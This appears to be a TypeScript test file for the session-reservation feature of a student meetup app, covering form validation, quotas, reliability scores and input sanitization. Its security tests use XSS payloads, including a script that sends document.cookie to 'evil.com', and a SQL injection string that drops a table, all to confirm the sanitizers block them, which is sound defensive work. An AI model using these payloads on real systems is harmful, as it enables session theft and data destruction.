/**
 * Comprehensive tests for the Reservation (Binome) mode
 * Covers: types, validation, business logic, sanitization, session lifecycle
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { z } from 'zod';
import { sanitizeInput, sanitizeDbText, sanitizeHtml, stripHtml } from '@/lib/sanitize';

// ============================================================================
// TYPE & SCHEMA TESTS
// ============================================================================
describe('Binome Session Types', () => {
  it('should define all activity types', async () => {
    const { useBinomeSessions } = await import('@/hooks/useBinomeSessions');
    expect(useBinomeSessions).toBeDefined();
  });

  it('should export correct activity types', async () => {
    type ActivityType = import('@/hooks/useBinomeSessions').ActivityType;
    const validActivities: ActivityType[] = ['studying', 'eating', 'working', 'talking', 'sport', 'other'];
    expect(validActivities).toHaveLength(6);
  });

  it('should export correct session statuses', async () => {
    type SessionStatus = import('@/hooks/useBinomeSessions').SessionStatus;
    const validStatuses: SessionStatus[] = ['open', 'full', 'cancelled', 'completed'];
    expect(validStatuses).toHaveLength(4);
  });

  it('should export correct duration options', async () => {
    type DurationOption = import('@/hooks/useBinomeSessions').DurationOption;
    const validDurations: DurationOption[] = [45, 90, 180];
    expect(validDurations).toHaveLength(3);
    validDurations.forEach(d => expect([45, 90, 180]).toContain(d));
  });

  it('should define ScheduledSession interface correctly', async () => {
    type ScheduledSession = import('@/hooks/useBinomeSessions').ScheduledSession;
    const session: ScheduledSession = {
      id: 'test-id',
      creator_id: 'creator-id',
      scheduled_date: '2026-03-01',
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
      max_participants: 3,
      status: 'open',
      created_at: new Date().toISOString(),
    };
    expect(session.id).toBe('test-id');
    expect(session.status).toBe('open');
  });

  it('should define CreateSessionInput interface correctly', async () => {
    type CreateSessionInput = import('@/hooks/useBinomeSessions').CreateSessionInput;
    const input: CreateSessionInput = {
      scheduled_date: '2026-03-01',
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
    };
    expect(input.city).toBe('Paris');
    expect(input.max_participants).toBeUndefined();
  });

  it('should define SessionFilters interface correctly', async () => {
    type SessionFilters = import('@/hooks/useBinomeSessions').SessionFilters;
    const filters: SessionFilters = { city: 'Lyon', activity: 'sport', date: '2026-03-01', duration: 45 };
    expect(filters.city).toBe('Lyon');
    expect(filters.activity).toBe('sport');
  });
});

// ============================================================================
// CREATE SESSION FORM VALIDATION TESTS
// ============================================================================
describe('Create Session Form Schema', () => {
  const formSchema = z.object({
    scheduled_date: z.date({ required_error: 'Date is required' }).refine(
      date => date >= new Date(new Date().setHours(0, 0, 0, 0)),
      { message: 'Date must be in the future' }
    ),
    start_time: z.string().min(1, 'Time is required'),
    duration_minutes: z.number().refine(val => [45, 90, 180].includes(val), { message: 'Invalid duration' }),
    activity: z.enum(['studying', 'eating', 'working', 'talking', 'sport', 'other'] as const),
    city: z.string().min(2, 'City is required').max(100),
    location_name: z.string().max(200).optional(),
    note: z.string().max(500).optional(),
    max_participants: z.number().min(1).max(10).default(3),
  });

  it('should accept valid session input', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
      max_participants: 3,
    });
    expect(result.success).toBe(true);
  });

  it('should reject past dates', () => {
    const yesterday = new Date();
    yesterday.setDate(yesterday.getDate() - 2);
    const result = formSchema.safeParse({
      scheduled_date: yesterday,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
      max_participants: 3,
    });
    expect(result.success).toBe(false);
  });

  it('should reject invalid duration', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 60, // Not valid
      activity: 'studying',
      city: 'Paris',
      max_participants: 3,
    });
    expect(result.success).toBe(false);
  });

  it('should reject empty city', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: '',
      max_participants: 3,
    });
    expect(result.success).toBe(false);
  });

  it('should reject max_participants > 10', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
      max_participants: 15,
    });
    expect(result.success).toBe(false);
  });

  it('should reject max_participants < 1', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
      max_participants: 0,
    });
    expect(result.success).toBe(false);
  });

  it('should accept max_participants from 1 to 10', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    for (let i = 1; i <= 10; i++) {
      const result = formSchema.safeParse({
        scheduled_date: tomorrow,
        start_time: '10:00',
        duration_minutes: 90,
        activity: 'studying',
        city: 'Paris',
        max_participants: i,
      });
      expect(result.success).toBe(true);
    }
  });

  it('should reject invalid activity type', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'dancing', // Not valid
      city: 'Paris',
      max_participants: 3,
    });
    expect(result.success).toBe(false);
  });

  it('should accept optional fields as undefined', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '14:30',
      duration_minutes: 45,
      activity: 'eating',
      city: 'Lyon',
      max_participants: 5,
      // location_name, note are optional
    });
    expect(result.success).toBe(true);
  });

  it('should reject note longer than 500 chars', () => {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    const result = formSchema.safeParse({
      scheduled_date: tomorrow,
      start_time: '10:00',
      duration_minutes: 90,
      activity: 'studying',
      city: 'Paris',
      max_participants: 3,
      note: 'a'.repeat(501),
    });
    expect(result.success).toBe(false);
  });
});

// ============================================================================
// CHAT MESSAGE SANITIZATION TESTS
// ============================================================================
describe('Chat Message Sanitization', () => {
  it('should sanitize HTML in chat messages', () => {
    const malicious = '<script>alert("xss")</script>Hello';
    const sanitized = sanitizeInput(malicious, 1000);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('Hello');
  });

  it('should strip HTML tags', () => {
    const html = '<b>Bold</b> <i>italic</i> <a href="evil">link</a>';
    const cleaned = stripHtml(html);
    expect(cleaned).toBe('Bold italic link');
  });

  it('should enforce maximum length', () => {
    const longMessage = 'a'.repeat(2000);
    const sanitized = sanitizeInput(longMessage, 1000);
    expect(sanitized.length).toBeLessThanOrEqual(1000);
  });

  it('should handle empty messages', () => {
    expect(sanitizeInput('', 1000)).toBe('');
    expect(sanitizeInput('   ', 1000)).toBe('');
  });

  it('should preserve normal text', () => {
    const normal = 'Salut ! On se retrouve à la BU à 14h ?';
    const sanitized = sanitizeInput(normal, 1000);
    expect(sanitized).toBe(normal);
  });

  it('should sanitize database text fields', () => {
    const input = '<script>alert("xss")</script>Normal text\0with null bytes';
    const sanitized = sanitizeDbText(input, 500);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('\0');
    expect(sanitized).toContain('Normal text');
  });

  it('should strip script tags for XSS prevention', () => {
    const xss = '<script>alert(1)</script>';
    const sanitized = sanitizeHtml(xss);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('alert');
    expect(sanitized).toBe('');
  });

  it('should handle event handler injection', () => {
    const xss = '<img onerror=alert(1) src=x>';
    const sanitized = sanitizeHtml(xss);
    // DOMPurify keeps the img tag but strips the dangerous onerror attribute
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).toContain('<img');
  });
});

// ============================================================================
// SESSION LIFECYCLE LOGIC TESTS
// ============================================================================
describe('Session Lifecycle Logic', () => {
  describe('Session Status Transitions', () => {
    it('should define valid status values', () => {
      const validStatuses = ['open', 'full', 'cancelled', 'completed'];
      validStatuses.forEach(status => {
        expect(['open', 'full', 'cancelled', 'completed']).toContain(status);
      });
    });

    it('should calculate session full status correctly', () => {
      const isSessionFull = (currentParticipants: number, maxParticipants: number) =>
        currentParticipants >= maxParticipants;

      expect(isSessionFull(3, 3)).toBe(true);
      expect(isSessionFull(2, 3)).toBe(false);
      expect(isSessionFull(0, 1)).toBe(false);
      expect(isSessionFull(10, 10)).toBe(true);
    });
  });

  describe('Late Cancellation Penalty', () => {
    it('should detect late cancellations (< 2h before session)', () => {
      const isLateCancellation = (sessionDateTime: Date) => {
        const hoursUntil = (sessionDateTime.getTime() - Date.now()) / (1000 * 60 * 60);
        return hoursUntil < 2;
      };

      // Session in 1 hour -> late
      const inOneHour = new Date(Date.now() + 60 * 60 * 1000);
      expect(isLateCancellation(inOneHour)).toBe(true);

      // Session in 3 hours -> not late
      const inThreeHours = new Date(Date.now() + 3 * 60 * 60 * 1000);
      expect(isLateCancellation(inThreeHours)).toBe(false);

      // Session already started -> late
      const pastSession = new Date(Date.now() - 60 * 60 * 1000);
      expect(isLateCancellation(pastSession)).toBe(true);
    });
  });

  describe('Quota Management', () => {
    it('should enforce free tier limit of 2 sessions/month', () => {
      const canCreateSession = (sessionsCreated: number, isPremium: boolean, purchasedSessions: number = 0) => {
        if (isPremium) return true;
        return sessionsCreated < (2 + purchasedSessions);
      };

      expect(canCreateSession(0, false)).toBe(true);
      expect(canCreateSession(1, false)).toBe(true);
      expect(canCreateSession(2, false)).toBe(false);
      expect(canCreateSession(10, true)).toBe(true);
      // With purchased sessions
      expect(canCreateSession(2, false, 1)).toBe(true);
      expect(canCreateSession(3, false, 1)).toBe(false);
    });
  });

  describe('Reliability Score Calculation (Bayesian)', () => {
    it('should calculate Bayesian average reliability', () => {
      const PRIOR_WEIGHT = 5;
      const PRIOR_MEAN = 80;

      const bayesianReliability = (positiveCount: number, totalCount: number) => {
        if (totalCount === 0) return PRIOR_MEAN;
        return Math.round(
          (PRIOR_WEIGHT * PRIOR_MEAN + positiveCount * 100) / (PRIOR_WEIGHT + totalCount) * 100
        ) / 100;
      };

      // New user with no feedback -> prior mean
      expect(bayesianReliability(0, 0)).toBe(80);

      // 1 positive feedback -> slightly above prior
      expect(bayesianReliability(1, 1)).toBeGreaterThan(80);
      expect(bayesianReliability(1, 1)).toBeLessThan(100);

      // 1 negative feedback -> slightly below prior
      expect(bayesianReliability(0, 1)).toBeLessThan(80);

      // Many positive feedbacks -> approaches 100
      const manyPositive = bayesianReliability(50, 50);
      expect(manyPositive).toBeGreaterThan(95);

      // Many negative feedbacks -> approaches 0
      const manyNegative = bayesianReliability(0, 50);
      expect(manyNegative).toBeLessThan(10);
    });

    it('should not make score volatile for new users', () => {
      const PRIOR_WEIGHT = 5;
      const PRIOR_MEAN = 80;

      const bayesianReliability = (positiveCount: number, totalCount: number) => {
        return (PRIOR_WEIGHT * PRIOR_MEAN + positiveCount * 100) / (PRIOR_WEIGHT + totalCount);
      };

      // 1 negative feedback for new user: should still be around 66, not 0
      const oneNegative = bayesianReliability(0, 1);
      expect(oneNegative).toBeGreaterThan(60);

      // Old non-Bayesian: 0/1 = 0% -> terrible
      // New Bayesian: still > 60% -> reasonable
    });
  });

  describe('Check-in Window Logic', () => {
    it('should determine if check-in window is open', () => {
      const isCheckinWindowOpen = (scheduledDate: string, startTime: string) => {
        const sessionDateTime = new Date(`${scheduledDate}T${startTime}`);
        const now = Date.now();
        const minutesBefore = (sessionDateTime.getTime() - now) / (1000 * 60);
        const minutesAfter = (now - sessionDateTime.getTime()) / (1000 * 60);

        // Window: 15 min before to 60 min after
        return minutesBefore <= 15 && minutesAfter <= 60;
      };

      // Create date for "15 minutes from now"
      const inFifteenMin = new Date(Date.now() + 15 * 60 * 1000);
      const dateStr = inFifteenMin.toISOString().split('T')[0];
      const timeStr = inFifteenMin.toTimeString().slice(0, 5);
      expect(isCheckinWindowOpen(dateStr, timeStr)).toBe(true);

      // Session 2 hours from now -> too early
      const inTwoHours = new Date(Date.now() + 120 * 60 * 1000);
      const dateStr2 = inTwoHours.toISOString().split('T')[0];
      const timeStr2 = inTwoHours.toTimeString().slice(0, 5);
      expect(isCheckinWindowOpen(dateStr2, timeStr2)).toBe(false);
    });

    it('should validate distance for check-in', () => {
      const isCloseEnough = (distanceMeters: number, maxDistanceMeters: number = 200) => {
        return distanceMeters <= maxDistanceMeters;
      };

      expect(isCloseEnough(50)).toBe(true);
      expect(isCloseEnough(200)).toBe(true);
      expect(isCloseEnough(201)).toBe(false);
      expect(isCloseEnough(1000)).toBe(false);
    });
  });
});

// ============================================================================
// SESSION QUOTA HOOK TESTS
// ============================================================================
describe('Session Quota', () => {
  it('should export useSessionQuota hook', async () => {
    const { useSessionQuota } = await import('@/hooks/useSessionQuota');
    expect(useSessionQuota).toBeDefined();
  });
});

// ============================================================================
// SESSION CHAT HOOK TESTS
// ============================================================================
describe('Session Chat', () => {
  it('should export useSessionChat hook', async () => {
    const { useSessionChat } = await import('@/hooks/useSessionChat');
    expect(useSessionChat).toBeDefined();
  });
});

// ============================================================================
// BINOME COMPONENTS EXPORT TESTS
// ============================================================================
describe('Binome Components', () => {
  it('should export CreateSessionForm', async () => {
    const { CreateSessionForm } = await import('@/components/binome/CreateSessionForm');
    expect(CreateSessionForm).toBeDefined();
  }, 15000);

  it('should export SessionCard', async () => {
    const { SessionCard } = await import('@/components/binome/SessionCard');
    expect(SessionCard).toBeDefined();
  });

  it('should export SessionFilters', async () => {
    const { SessionFilters } = await import('@/components/binome/SessionFilters');
    expect(SessionFilters).toBeDefined();
  });

  it('should export SessionQuotaBadge', async () => {
    const { SessionQuotaBadge } = await import('@/components/binome/SessionQuotaBadge');
    expect(SessionQuotaBadge).toBeDefined();
  });

  it('should export ChatInput', async () => {
    const { ChatInput } = await import('@/components/binome/ChatInput');
    expect(ChatInput).toBeDefined();
  });

  it('should export ChatMessageBubble', async () => {
    const { ChatMessageBubble } = await import('@/components/binome/ChatMessageBubble');
    expect(ChatMessageBubble).toBeDefined();
  });
});

// ============================================================================
// SECURITY: INPUT VALIDATION EDGE CASES
// ============================================================================
describe('Reservation Security Edge Cases', () => {
  it('should sanitize SQL injection attempts in city name', () => {
    const maliciousCity = "Paris'; DROP TABLE scheduled_sessions; --";
    const sanitized = sanitizeDbText(maliciousCity, 100);
    // Should preserve the text (SQL injection is handled server-side via parameterized queries)
    expect(sanitized).toBeDefined();
    expect(sanitized.length).toBeLessThanOrEqual(100);
  });

  it('should sanitize XSS in session note', () => {
    const maliciousNote = '<img src=x onerror=alert(document.cookie)>Study group';
    const sanitized = stripHtml(maliciousNote);
    expect(sanitized).not.toContain('<img');
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).toContain('Study group');
  });

  it('should sanitize XSS in location name', () => {
    const malicious = '<script>fetch("evil.com?c="+document.cookie)</script>BU Sciences';
    const sanitized = sanitizeInput(malicious, 200);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('BU Sciences');
  });

  it('should handle unicode and special characters in city names', () => {
    const cities = ['São Paulo', 'Zürich', 'Île-de-France', 'Москва', '東京'];
    cities.forEach(city => {
      const sanitized = sanitizeInput(city, 100);
      expect(sanitized).toBe(city);
    });
  });

  it('should handle empty and null-like inputs', () => {
    expect(sanitizeInput('', 1000)).toBe('');
    expect(sanitizeDbText('', 500)).toBe('');
    expect(stripHtml('')).toBe('');
  });

  it('should truncate very long session notes', () => {
    const longNote = 'A'.repeat(1000);
    const sanitized = sanitizeDbText(longNote, 500);
    expect(sanitized.length).toBeLessThanOrEqual(500);
  });
});
